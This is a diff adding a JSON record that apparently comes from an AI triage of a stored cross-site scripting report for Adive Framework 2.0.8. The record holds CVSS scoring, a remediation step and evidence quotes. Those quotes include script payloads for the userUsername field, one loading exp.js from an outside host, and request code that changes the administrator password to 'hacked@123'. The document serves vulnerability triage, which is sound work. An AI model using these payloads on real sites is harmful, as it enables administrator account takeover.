@@ -1,0 +1,73 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Stored cross-site scripting in Adive Framework 2.0.8 via the userUsername parameter enables an attacker to inject JavaScript that, when an administrator views the page, issues a POST to /admin/config to change the administrator password.",
+    "affected_product": "Adive Framework 2.0.8",
+    "cwe": "CWE-79",
+    "cwe_quote": "The parameter 'userUsername=' is vulnerable to Stored Cross-site scripting",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "POST /admin/user/add HTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "PR": {
+        "value": "N",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "UI": {
+        "value": "R",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "S": {
+        "value": "U",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "C": {
+        "value": "H",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "I": {
+        "value": "H",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "A": {
+        "value": "L",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      }
+    },
+    "recommended_next_step": "Reproduce the issue by submitting a stored XSS payload in userUsername, confirm admin-facing execution and the POST to /admin/config, then immediately mitigate by removing the stored malicious entry and add server-side input validation/encoding for userUsername and CSRF protections on sensitive config endpoints.",
+    "confidence": "medium",
+    "evidence_quotes": [
+      {
+        "claim": "Stored XSS location and parameter",
+        "quote": "The parameter 'userUsername=' is vulnerable to Stored Cross-site scripting"
+      },
+      {
+        "claim": "Proof-of-concept XSS payload submission",
+        "quote": "userName=test&userUsername=<script>alert('xss')</script>&pass=test&cpass=test&permission=3"
+      },
+      {
+        "claim": "Attack triggers when admin visits and changes password",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      {
+        "claim": "CSRF via injected script issues POST to change admin password",
+        "quote": "xhttp.open(\"POST\", nuri, true);\n  xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n  xhttp.withCredentials = \"true\";\n  var body = \"\";\n  body += \"\\r\\n\\r\\n\";\n  body +=\n\t\"userName=Administrator&confPermissions=1&pass=hacked@123&cpass=hacked@123&invokeType=web\";"
+      },
+      {
+        "claim": "Example of stored payload referencing external JS",
+        "quote": "userName=%3Cscript+src%3D%22http%3A%2F%2F192.168.2.5%2Fexp.js%22%3E%3C%2Fscript%3E&userUsername=test&pass=test&cpass=test&permission=3"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2316,
+    "output_tokens": 1803,
+    "latency_s": null,
+    "batch": true
+  }
+}
